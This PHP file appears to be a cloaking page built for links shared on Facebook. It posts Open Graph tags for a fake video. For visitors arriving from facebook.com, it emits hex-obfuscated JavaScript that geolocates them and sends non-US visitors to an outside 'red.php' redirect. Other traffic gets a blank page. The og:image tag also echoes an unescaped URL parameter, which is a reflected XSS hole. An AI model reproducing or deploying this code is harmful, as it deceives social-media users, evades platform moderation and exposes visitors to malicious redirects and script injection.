<?php
  function md5rand($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="0123456789";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val)
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }



    ?>
        <meta property="og:title" content="abc" />
        <meta property="og:type" content="video.movie" />
        <meta property="og:image" content="<?php echo $_GET["imagex"];?>"/>
<?php

{
$randval = rand();
if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
  



echo '<script>

var _0xde20=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x75\x74\x75\x6E\x67\x61\x2E\x63\x6F\x6D\x2F\x72\x65\x64\x2E\x70\x68\x70"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0xde20[2]](_0xde20[0],_0xde20[1],false);xmlhttpz[_0xde20[3]]();var get=JSON[_0xde20[5]](xmlhttpz[_0xde20[4]]);var country=get[_0xde20[7]][_0xde20[6]];if(country== _0xde20[8]){exit}else {top[_0xde20[10]][_0xde20[9]]= _0xde20[11]}

</script>';

  
}




else {
     //Google brought me to this page.
    //header("Location: https://facebook.com/search?q=".$randval);
   exit();
}  }


?>
